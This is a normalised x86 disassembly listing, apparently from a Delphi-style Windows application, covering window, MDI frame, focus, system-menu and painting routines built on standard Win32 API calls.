cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_4516c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f2d8
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_44f2e0
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_438684
push 0x0
mov eax ebx
call sub_43b290
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_44f324
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_438e08
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_43b290
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_43b290
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_44f388
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44f430
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f437
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
mov eax edi
call sub_44b71c
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_4032f4
mov eax ebx
call sub_44f740
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_4032f4
test al al
jne r-xdata
sub_44f440
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_437d6c
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_437d6c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_44f388
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_44f488
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_44f388
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_44f4ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_413b90
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_413a70
mov eax edi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_413b90
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_413a70
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_44f71c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_43b290
mov dx 0xb000
call sub_44b4e4
test al al
jne r-xdata
call sub_43b290
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_44b4e4
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f723
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_403918
jmp r-xdata
call sub_403918
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_437d6c
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_43b290
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_44b4e4
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_435c5c
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
call sub_403918
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_43b290
mov dx 0xb01a
call sub_44b4e4
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_403918
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_435c5c
sub_44f740
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_435c5c
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_43b290
push eax
call SetFocus
mov eax ebx
call sub_43b290
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_44f790
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_435c5c
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_44f844
mov eax esi
call sub_44f740
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_43b6b8
mov edx eax
mov eax esi
call sub_44f388
sub_44f7f4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_44e40c
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_435c5c
mov eax ebx
call sub_44e40c
mov edx esi
call sub_44f7f4
sub_44f844
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_4486b4
mov edx esi
call sub_448698
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_44f8ec
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_43b290
push eax
call SendMessageA
sub_44f938
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_44f8ec
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_44f968
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_44f8ec
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_44f9d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_41d948
xor eax eax
push ebp
push sub_44fa82
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_41dc3c
xor eax eax
push ebp
push sub_44fa5f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_4032f4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fa66
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_41dc3c
retn
sub_44fa90
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_44e40c
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_44e440
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_4032f4
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_43a558
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_44e48c
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_4032f4
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_44fb30
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_43b290
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_43b290
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_44f9b8
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_43b290
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_439420
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_44fbae
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_41d528
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_44fc10
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_43b290
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_4396e4
pop edi
pop esi
retn
sub_44fc5c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43b290
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_44fd58
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_44e780
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_44fc5c
pop ecx
sub_44fd8c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_436178
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_43b290
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_43b290
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_43b290
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_435150
pop esi
pop ebx
retn
sub_44fe1c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_43b290
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_43a4e4
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_43b290
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_4480d4
sub_44fe7c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_439580
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_447ae8
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_44fec8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_448348
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_44ff00
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_44ff9b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ffa2
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_447a48
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_454cbc
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_431bf4
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_454cbc
jmp r-xdata
sub_44ffc8
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_4032f4
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_450008
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40c7d0
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_450034
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_44f7f4
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_4319cc
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_45008c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_43a3c8
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_453670
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_4032f4
sub_450118
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_43b290
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_43b290
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_43b290
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4501b0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_43b290
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_44f790
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_4032f4
sub_450208
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_43b7c4
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_450234
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_44f7f4
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_450250
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_447a78
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_447a78
sub_450290
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_4502c8
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_403f08
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_4502fc
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45044d
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450454
lea eax [ ebp - 0x10 ]
call sub_403eb4
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_450250
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_431970
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_412598
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_4345a8
lea eax [ ebp - 0x1c ]
call sub_4067b4
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_450250
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_450290
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_454960
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_4549c8
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_4549c8
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_4502c8
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_412598
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_4345a8
lea eax [ ebp - 0x1c ]
call sub_4067b4
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_4548f8
test [ esi + 0x228 ] 0x8
je r-xdata
sub_45045c
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
